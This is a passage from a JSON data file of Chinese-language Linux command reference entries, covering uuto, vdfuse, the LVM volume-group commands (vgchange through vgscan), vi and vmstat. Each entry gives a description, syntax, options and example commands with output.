        "body": "<h1 id=\"uuto\">uuto</h1>\n<p>将文件传送到远端的UUCP主机</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>uuto命令</strong> 为script文件，它实际上会执行uucp，用来将文件传送到远端UUCP主机，并在完成工作后，以邮件通知远端主机上的用户。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">uuto <span class=\"hljs-selector-attr\">[文件]</span><span class=\"hljs-selector-attr\">[目的]</span>\n</code></pre>\n<h3 id=\"例子\">例子</h3>\n<p>将文件传送到远程 UUCP 主机 localhost 的 tmp 目录，在命令提示符中直接输入如下命令：</p>\n<pre><code class=\"language-shell\">uuto.<span class=\"hljs-regexp\">/testfile localhost/</span>tmp <span class=\"hljs-comment\"># 将文件传送到远程UUCP 主机localhost的tmp目录 </span>\n</code></pre>\n<p>该命令通常没有输出。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "vdfuse",
        "des": "VirtualBox软件挂载VDI分区文件工具",
        "body": "<h1 id=\"vdfuse\">vdfuse</h1>\n<p>VirtualBox软件挂载VDI分区文件工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>vdfuse命令</strong> 是VirtualBox软件挂载VDI分区文件的一个工具，VirtualBox是一款能创建虚拟机的开源软件，vdi是它的默认磁盘格式。</p>\n<h3 id=\"什么是virtualbox\">什么是VirtualBox</h3>\n<p>VirtualBox是一款功能强大的x86虚拟机软件，它不仅具有丰富的特色，而且性能也很优异。更可喜的是，VirtualBox于数日前走向开源，成为了一个发布在GPL许可之下的自由软件。VirtualBox可以在Linux和Windows主机中运行，并支持在其中安装Windows (NT 4.0、2000、XP、Server 2003、Vista)、DOS/Windows 3.x、Linux (2.4 和 2.6)、OpenBSD等系列的客户操作系统。</p>\n<p> <strong>在Ubuntu中安装vdfuse，打开终端，输入：</strong> </p>\n<pre><code class=\"language-shell\">sudo apt-<span class=\"hljs-built_in\">get</span> install virtualbox-fuse\n</code></pre>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">vdfuse [<span class=\"hljs-keyword\">options</span>] -f image-<span class=\"hljs-keyword\">file</span> mountpoint\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-h 帮助</span>\n<span class=\"hljs-deletion\">-r 只读</span>\n<span class=\"hljs-deletion\">-t 类型 (VDI, VMDK, VHD, or raw; default: auto)</span>\n<span class=\"hljs-deletion\">-f 镜像文件</span>\n<span class=\"hljs-deletion\">-a 允许所有用户读取</span>\n<span class=\"hljs-deletion\">-w 允许所有用户都写</span>\n<span class=\"hljs-deletion\">-g 前台运行</span>\n<span class=\"hljs-deletion\">-v 输出反馈</span>\n<span class=\"hljs-deletion\">-d debug模式</span>\n</code></pre>\n<p>注意：必须编辑一下<code>/etc/fuse.confand</code>，去掉 \"user_allow_other\" 前面的注释符号（#），否则不能正确运行。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用如下如下语句挂载.vdi文件：</p>\n<pre><code class=\"language-shell\">sudo vdfuse -f <span class=\"hljs-regexp\">/path/</span>to<span class=\"hljs-regexp\">/file.vdi /</span>path<span class=\"hljs-regexp\">/to/m</span>ountpoint\n</code></pre>\n<p><code>/path/to/mountpoint</code>应该包含如下文件EntireDisk、Partition1等，如果只有一个文件，你可能需要这样挂载：</p>\n<pre><code class=\"language-shell\">mount <span class=\"hljs-regexp\">/path/</span>to<span class=\"hljs-regexp\">/mountpoint/</span>Partition1 <span class=\"hljs-regexp\">/path/</span>to<span class=\"hljs-regexp\">/someother/m</span>ountpoint\n</code></pre>\n<p>文件系统就挂载到<code>/path/to/someother/mountpoint</code>了。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "vgchange",
        "des": "修改卷组属性",
        "body": "<h1 id=\"vgchange\">vgchange</h1>\n<p>修改卷组属性</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>vgchange命令</strong> 用于修改卷组的属性，经常被用来设置卷组是处于活动状态或非活动状态。处于活动状态的卷组无法被删除，必须使用vgchange命令将卷组设置为非活动状态后才能删除。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">vgchange</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-<span class=\"hljs-selector-tag\">a</span>：设置卷组的活动状态。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>卷组：指定要设置属性的卷组。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用vgchange命令将卷组状态改为活动的。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># vgchange -ay vg1000     #将卷组<span class=\"hljs-string\">\"vg1000\"</span>设置为活动状态</span>\n</code></pre>\n<p>输出信息如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">1 </span>logical volume(s) in volume group <span class=\"hljs-string\">\"vg1000\"</span> now active\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "vgconvert",
        "des": "转换卷组元数据格式",
        "body": "<h1 id=\"vgconvert\">vgconvert</h1>\n<p>转换卷组元数据格式</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>vgconvert命令</strong> 用于转换指定LVM卷组的元数据格式，通常将“LVM1”格式的卷组转换为“LVM2”格式。转换卷组元数据前必须保证卷组处于非活动状态，否则无法完成转换操作。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">vgconvert</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-M：要转换的卷组格式。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>卷组：指定要转换格式的卷组。</p>\n<h3 id=\"实例\">实例</h3>\n<p>转换卷组元数据格式前，使用vgchange命令将卷组设置为非活动状态。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root@localhost lvm]<span class=\"hljs-comment\"># vgchange -an vg1000    #设置卷组状态为非活动状态</span>\n<span class=\"hljs-number\">0</span>&nbsp;logical&nbsp;<span class=\"hljs-keyword\">volume</span><span class=\"language-bash\">(s)&nbsp;<span class=\"hljs-keyword\">in</span>&nbsp;volume&nbsp;group&nbsp;<span class=\"hljs-string\">\"vg1000\"</span>&nbsp;now&nbsp;active&nbsp;</span>\n\n```<span class=\"hljs-keyword\">shell</span><span class=\"language-bash\">\n</span>\n使用vgconvert命令将卷组<span class=\"hljs-string\">\"vg1000\"</span>从<span class=\"hljs-string\">\"LVM1\"</span>格式转换为<span class=\"hljs-string\">\"LVM2\"</span>格式。在命令行中输入下面的命令：\n\n```<span class=\"hljs-keyword\">shell</span><span class=\"language-bash\">\n[root@localhost lvm]<span class=\"hljs-comment\"># vgconvert -M2 vg1000    #转换卷组为\"LVM2\"格式</span></span>\n<span class=\"hljs-keyword\">Volume</span><span class=\"language-bash\"> group vg1000 successfully converted</span>\n</code></pre>\n<p>使用vgchange命令将卷组设置为活动状态。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root@localhost lvm]<span class=\"hljs-comment\"># vgchange -ay vg1000     #设置卷组状态为活动状态</span>\n<span class=\"hljs-number\">0</span> logical volume(s) <span class=\"hljs-keyword\">in</span> volume <span class=\"hljs-keyword\">group</span> <span class=\"hljs-title\">\"vg1000</span><span class=\"hljs-string\">\" now active</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "vgcreate",
        "des": "用于创建LVM卷组",
        "body": "<h1 id=\"vgcreate\">vgcreate</h1>\n<p>用于创建LVM卷组</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>vgcreate命令</strong> 用于创建LVM卷组。卷组（Volume Group）将多个物理卷组织成一个整体，屏蔽了底层物理卷细节。在卷组上创建逻辑卷时不用考虑具体的物理卷信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">vgcreate</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-l：卷组上允许创建的最大逻辑卷数；</span>\n<span class=\"hljs-deletion\">-p：卷组中允许添加的最大物理卷数；</span>\n<span class=\"hljs-deletion\">-s：卷组上的物理卷的PE大小。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  卷组名：要创建的卷组名称；</li>\n<li>  物理卷列表：要加入到卷组中的物理卷列表。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>使用vgcreate命令创建卷组 \"vg1000\"，并且将物理卷<code>/dev/sdb1</code>和<code>/dev/sdb2</code>添加到卷组中。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# vgcreate vg1000 <span class=\"hljs-regexp\">/dev/</span>sdb1 <span class=\"hljs-regexp\">/dev/</span>sdb2  #创建卷组<span class=\"hljs-string\">\"vg1000\"</span>\n</code></pre>\n<p>输出信息如下：</p>\n<pre><code class=\"language-shell\">Volume <span class=\"hljs-keyword\">group</span> <span class=\"hljs-title\">\"vg1000</span><span class=\"hljs-string\">\" successfully created</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "vgdisplay",
        "des": "显示LVM卷组的信息",
        "body": "<h1 id=\"vgdisplay\">vgdisplay</h1>\n<p>显示LVM卷组的信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>vgdisplay命令</strong> 用于显示LVM卷组的信息。如果不指定\"卷组\"参数，则分别显示所有卷组的属性。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">vgdisplay</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-A：仅显示活动卷组的属性；</span>\n<span class=\"hljs-deletion\">-s：使用短格式输出的信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>卷组：要显示属性的卷组名称。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用vgdisplay命令显示存在的卷组\"vg1000\"的属性。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># vgdisplay vg1000     #显示卷组<span class=\"hljs-string\">\"vg1000\"</span>的属性</span>\n</code></pre>\n<p>输出信息如下：</p>\n<pre><code class=\"language-shell\">  --- Volume <span class=\"hljs-keyword\">group</span> ---  \n  VG Name               vg1000  \n<span class=\"hljs-params\">...</span><span class=\"hljs-params\">...</span>省略部分输出内容<span class=\"hljs-params\">...</span><span class=\"hljs-params\">...</span>  \n  free  PE / Size       <span class=\"hljs-number\">50</span> / <span class=\"hljs-number\">200.00</span> MB  \n  VG UUID  ICprwg<span class=\"hljs-params\">-ZmhA</span><span class=\"hljs-params\">-JKYF</span><span class=\"hljs-params\">-WYuy</span><span class=\"hljs-params\">-jNHa</span><span class=\"hljs-params\">-AyCN</span><span class=\"hljs-params\">-ZS5F7B</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "vgextend",
        "des": "向卷组中添加物理卷",
        "body": "<h1 id=\"vgextend\">vgextend</h1>\n<p>向卷组中添加物理卷</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>vgextend命令</strong> 用于动态扩展LVM卷组，它通过向卷组中添加物理卷来增加卷组的容量。LVM卷组中的物理卷可以在使用vgcreate命令创建卷组时添加，也可以使用vgextend命令动态的添加。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">vgextend</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：调试模式；</span>\n<span class=\"hljs-deletion\">-t：仅测试。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  卷组：指定要操作的卷组名称；</li>\n<li>  物理卷列表：指定要添加到卷组中的物理卷列表。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>使用vgextend命令向卷组\"vg2000\"中添加物理卷。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># vgextend vg2000 /dev/sdb2     #将物理卷<span class=\"hljs-string\">\"/dev/sdb2\"</span>加入卷组<span class=\"hljs-string\">\"vg2000\"</span></span>\n</code></pre>\n<p>输出信息如下：</p>\n<pre><code class=\"language-shell\">Volume <span class=\"hljs-keyword\">group</span> <span class=\"hljs-title\">\"vg2000</span><span class=\"hljs-string\">\" successfully extended</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "vgreduce",
        "des": "从卷组中删除物理卷",
        "body": "<h1 id=\"vgreduce\">vgreduce</h1>\n<p>从卷组中删除物理卷</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>vgreduce命令</strong> 通过删除LVM卷组中的物理卷来减少卷组容量。不能删除LVM卷组中剩余的最后一个物理卷。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">vgreduce</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：如果命令行中没有指定要删除的物理卷，则删除所有的空物理卷；</span>\n<span class=\"hljs-deletion\">--removemissing：删除卷组中丢失的物理卷，使卷组恢复正常状态。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  卷组：指定要操作的卷组名称；</li>\n<li>  物理卷列表：指定要删除的物理卷列表。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>使用vgreduce命令从卷组\"vg2000\"中移除物理卷<code>/dev/sdb2</code>。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># vgreduce vg2000 /dev/sdb2    #将物理卷<span class=\"hljs-string\">\"/dev/sdb2\"</span>从卷组<span class=\"hljs-string\">\"vg2000\"</span>中删除</span>\n</code></pre>\n<p>输出信息如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">Removed \"/dev/sdb2\" from volume group \"vg2000\"</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "vgremove",
        "des": "用于用户删除LVM卷组",
        "body": "<h1 id=\"vgremove\">vgremove</h1>\n<p>用于用户删除LVM卷组</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>vgremove命令</strong> 用于用户删除LVM卷组。当要删除的卷组上已经创建了逻辑卷时，vgremove命令需要进行确认删除，防止误删除数据。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">vgremove</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f：强制删除。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>卷组：指定要删除的卷组名称。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用vgremove命令删除LVM卷组\"vg1000\"。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># vgremove vg1000    #删除卷组<span class=\"hljs-string\">\"vg1000\"</span></span>\nVolume group <span class=\"hljs-string\">\"vg1000\"</span> successfully removed\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "vgrename",
        "des": "使用vgrename命令可以重命名卷组的名称",
        "body": "<h1 id=\"vgrename\">vgrename</h1>\n<p>使用vgrename命令可以重命名卷组的名称</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>grename命令</strong> 可以重命名卷组的名称。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">vgrename <span class=\"hljs-selector-attr\">[选项]</span> <span class=\"hljs-selector-attr\">[旧卷组路径|旧卷组名称|旧卷组UUID]</span> <span class=\"hljs-selector-attr\">[新卷组路径|新卷组名称]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d 启用调试模式</span>\n<span class=\"hljs-deletion\">-t 启用测试模式</span>\n</code></pre>\n<h3 id=\"例子\">例子</h3>\n<p>重命名卷组/dev/vg1为/dev/vg2。</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# vgrename <span class=\"hljs-regexp\">/dev/</span>vg1 <span class=\"hljs-regexp\">/dev/</span>vg2\n  Volume <span class=\"hljs-keyword\">group</span> <span class=\"hljs-string\">\"vg1\"</span> successfullyrenamed to <span class=\"hljs-string\">\"vg2\"</span>\n</code></pre>\n<p>重命名卷组vg1为vg2。</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># vgrename vg1 vg2</span>\n  Volume group <span class=\"hljs-string\">\"vg1\"</span> successfully renamed <span class=\"hljs-keyword\">to</span> <span class=\"hljs-string\">\"vg2\"</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "vgscan",
        "des": "扫描并显示系统中的卷组",
        "body": "<h1 id=\"vgscan\">vgscan</h1>\n<p>扫描并显示系统中的卷组</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>vgscan命令</strong> 查找系统中存在的LVM卷组，并显示找到的卷组列表。vgscan命令仅显示找到的卷组的名称和LVM元数据类型，要得到卷组的详细信息需要使用vgdisplay命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">vgscan</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：调试模式；</span>\n<span class=\"hljs-deletion\">--ignorerlockingfailure：忽略锁定失败的错误。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>使用vgscan命令扫描系统中所有的卷组。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># vgscan     #扫描并显示LVM卷组列表</span>\n</code></pre>\n<p>输出信息如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">Found</span> volume <span class=\"hljs-keyword\">group</span> \"vg2000\" <span class=\"hljs-keyword\">using</span> metadata <span class=\"hljs-keyword\">type</span> lvm2  \n<span class=\"hljs-built_in\">Found</span> volume <span class=\"hljs-keyword\">group</span> \"vg1000\" <span class=\"hljs-keyword\">using</span> metadata <span class=\"hljs-keyword\">type</span> lvm2 \n</code></pre>\n<p>说明：本例中，vgscan指令找到了两个LVM2卷组\"vg1000\"和\"vg2000\"。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "vi",
        "des": "功能强大的纯文本编辑器",
        "body": "<h1 id=\"vi\">vi</h1>\n<p>功能强大的纯文本编辑器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>vi命令</strong> 是UNIX操作系统和类UNIX操作系统中最通用的全屏幕纯文本编辑器。Linux中的vi编辑器叫vim，它是vi的增强版（vi Improved），与vi编辑器完全兼容，而且实现了很多增强功能。</p>\n<p>vi编辑器支持编辑模式和命令模式，编辑模式下可以完成文本的编辑功能，命令模式下可以完成对文件的操作命令，要正确使用vi编辑器就必须熟练掌握着两种模式的切换。默认情况下，打开vi编辑器后自动进入命令模式。从编辑模式切换到命令模式使用“esc”键，从命令模式切换到编辑模式使用“A”、“a”、“O”、“o”、“I”、“i”键。</p>\n<p>vi编辑器提供了丰富的内置命令，有些内置命令使用键盘组合键即可完成，有些内置命令则需要以冒号“：”开头输入。常用内置命令如下：</p>\n<pre><code class=\"language-shell\">Ctrl+u：向文件首翻半屏；\nCtrl+d：向文件尾翻半屏；\nCtrl+f：向文件尾翻一屏；\nCtrl+b：向文件首翻一屏；\nEsc：从编辑模式切换到命令模式；\nZZ：命令模式下保存当前文件所做的修改后退出vi；\n<span class=\"hljs-symbol\">:</span>行号：光标跳转到指定行的行首；\n<span class=\"hljs-symbol\">:</span><span class=\"hljs-variable\">$：</span>光标跳转到最后一行的行首；\nx或X：删除一个字符，x删除光标后的，而X删除光标前的；\nD：删除从当前光标到光标所在行尾的全部字符；\ndd：删除光标行正行内容；\nndd：删除当前行及其后n<span class=\"hljs-number\">-1</span>行；\nnyy：将当前行及其下n行的内容保存到寄存器？中，其中？为一个字母，n为一个数字；\np：粘贴文本操作，用于将缓存区的内容粘贴到当前光标所在位置的下方；\nP：粘贴文本操作，用于将缓存区的内容粘贴到当前光标所在位置的上方；\n/字符串：文本查找操作，用于从当前光标所在位置开始向文件尾部查找指定字符串的内容，查找的字符串会被加亮显示；\n？字符串：文本查找操作，用于从当前光标所在位置开始向文件头部查找指定字符串的内容，查找的字符串会被加亮显示；\na，bs/F/T：替换文本操作，用于在第a行到第b行之间，将F字符串换成T字符串。其中，“s/”表示进行替换操作；\na：在当前字符后添加文本；\nA：在行末添加文本；\ni：在当前字符前插入文本；\nI：在行首插入文本；\no：在当前行后面插入一空行；\nO：在当前行前面插入一空行；\n<span class=\"hljs-symbol\">:wq</span>：在命令模式下，执行存盘退出操作；\n<span class=\"hljs-symbol\">:w</span>：在命令模式下，执行存盘操作；\n<span class=\"hljs-symbol\">:w</span>！：在命令模式下，执行强制存盘操作；\n<span class=\"hljs-symbol\">:q</span>：在命令模式下，执行退出vi操作；\n<span class=\"hljs-symbol\">:q</span>！：在命令模式下，执行强制退出vi操作；\n<span class=\"hljs-symbol\">:e</span>文件名：在命令模式下，打开并编辑指定名称的文件；\n<span class=\"hljs-symbol\">:n</span>：在命令模式下，如果同时打开多个文件，则继续编辑下一个文件；\n<span class=\"hljs-symbol\">:f</span>：在命令模式下，用于显示当前的文件名、光标所在行的行号以及显示比例；\n<span class=\"hljs-symbol\">:set</span> number：在命令模式下，用于在最左端显示行号；\n<span class=\"hljs-symbol\">:set</span> nonumber：在命令模式下，用于在最左端不显示行号；\n</code></pre>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">vi</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-addition\">+&lt;行号&gt;：从指定行号的行开始显示文本内容；</span>\n<span class=\"hljs-deletion\">-b：以二进制模式打开文件，用于编辑二进制文件和可执行文件；</span>\n<span class=\"hljs-deletion\">-c&lt;指令&gt;：在完成对第一个文件编辑任务后，执行给出的指令；</span>\n<span class=\"hljs-deletion\">-d：以diff模式打开文件，当多个文件编辑时，显示文件差异部分；</span>\n<span class=\"hljs-deletion\">-l：使用lisp模式，打开“lisp”和“showmatch”；</span>\n<span class=\"hljs-deletion\">-m：取消写文件功能，重设“write”选项；</span>\n<span class=\"hljs-deletion\">-M：关闭修改功能；</span>\n<span class=\"hljs-deletion\">-n：不实用缓存功能；</span>\n<span class=\"hljs-deletion\">-o&lt;文件数目&gt;：指定同时打开指定数目的文件；</span>\n<span class=\"hljs-deletion\">-R：以只读方式打开文件；</span>\n<span class=\"hljs-deletion\">-s：安静模式，不现实指令的任何错误信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件列表：指定要编辑的文件列表。多个文件之间使用空格分隔开。</p>\n<h2 id=\"知识扩展\">知识扩展</h2>\n<p>vi编辑器有三种工作方式：命令方式、输入方式和ex转义方式。通过相应的命令或操作，在这三种工作方式之间可以进行转换。</p>\n<p><strong>命令方式</strong> </p>\n<p>在Shell提示符后输入命令vi，进入vi编辑器，并处于vi的命令方式。此时，从键盘上输入的任何字符都被作为编辑命令来解释，例如，a(append）表示附加命令，i(insert）表示插入命令，x表示删除字符命令等。如果输入的字符不是vi的合法命令，则机器发出“报警声”，光标不移动。另外，在命令方式下输入的字符（即vi命令）并不在屏幕上显示出来，例如，输入i，屏幕上并无变化，但通过执行i命令，编辑器的工作方式却发生变化：由命令方式变为输入方式。</p>\n<p><strong>输入方式</strong> </p>\n<p>通过输入vi的插入命令（i）、附加命令（a）、打开命令（o）、替换命令（s）、修改命令(c）或取代命令（r）可以从命令方式进入输入方式。在输入方式下，从键盘上输入的所有字符都被插入到正在编辑的缓冲区中，被当做该文件的正文。进入输入方式后，输入的可见字符都在屏幕上显示出来，而编辑命令不再起作用，仅作为普通字母出现。例如，在命令方式下输入字母i，进到输入方式，然后再输入i，就在屏幕上相应光标处添加一个字母i。</p>\n<p>由输入方式回到命令方式的办法是按下Esc键。如果已在命令方式下，那么按下Esc键就会发出“嘟嘟”声。为了确保用户想执行的vi命令是在命令方式下输入的，不妨多按几下Esc键，听到嘟声后再输入命令。</p>\n<p><strong>ex转义方式</strong> </p>\n<p>vi和ex编辑器的功能是相同的，二者的主要区别是用户界面。在vi中，命令通常是单个字母，如a,x,r等。而在ex中，命令是以Enter；键结束的命令行。vi有一个专门的“转义”命令，可访问很多面向行的ex命令。为使用ex转义方式，可输入一个冒号（:）。作为ex命令提示符，冒号出现在状态行（通常在屏幕最下一行）。按下中断键（通常是Del键），可终止正在执行的命令。多数文件管理命令都是在ex转义方式下执行的（例如，读取文件，把编辑缓冲区的内容写到文件中等）。转义命令执行后，自动回到命令方式。例如：</p>\n<pre><code class=\"language-shell\">:<span class=\"hljs-number\">1</span>,<span class=\"hljs-variable\">$s</span><span class=\"hljs-regexp\">/I/i</span><span class=\"hljs-regexp\">/g 按Enter键</span>\n</code></pre>\n<p>则从文件第一行至文件末尾（$）将大写I全部替换成小写i。vi编辑器的三种工作方式之间的转换如图所示。</p>\n<p>!vi</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "vmstat",
        "des": "显示虚拟内存状态",
        "body": "<h1 id=\"vmstat\">vmstat</h1>\n<p>显示虚拟内存状态</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>vmstat命令</strong> 的含义为显示虚拟内存状态（“Viryual Memor Statics”），但是它可以报告关于进程、内存、I/O等系统整体运行状态。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">vmstat</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：显示活动内页；</span>\n<span class=\"hljs-deletion\">-f：显示启动后创建的进程总数；</span>\n<span class=\"hljs-deletion\">-m：显示slab信息；</span>\n<span class=\"hljs-deletion\">-n：头信息仅显示一次；</span>\n<span class=\"hljs-deletion\">-s：以表格方式显示事件计数器和内存状态；</span>\n<span class=\"hljs-deletion\">-d：报告磁盘状态；</span>\n<span class=\"hljs-deletion\">-p：显示指定的硬盘分区状态；</span>\n<span class=\"hljs-deletion\">-S：输出信息的单位。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  事件间隔：状态信息刷新的时间间隔；</li>\n<li>  次数：显示报告的次数。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">vmstat</span> <span class=\"hljs-number\">3</span>\n<span class=\"hljs-attribute\">procs</span> -----------memory---------- ---swap-- -----io---- --system-- -----cpu------\n <span class=\"hljs-attribute\">r</span>  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st\n <span class=\"hljs-attribute\">0</span>  <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">320</span>  <span class=\"hljs-number\">42188</span> <span class=\"hljs-number\">167332</span> <span class=\"hljs-number\">1534368</span>    <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">4</span>     <span class=\"hljs-number\">7</span>    <span class=\"hljs-number\">1</span>    <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">99</span>  <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">0</span>\n <span class=\"hljs-attribute\">0</span>  <span 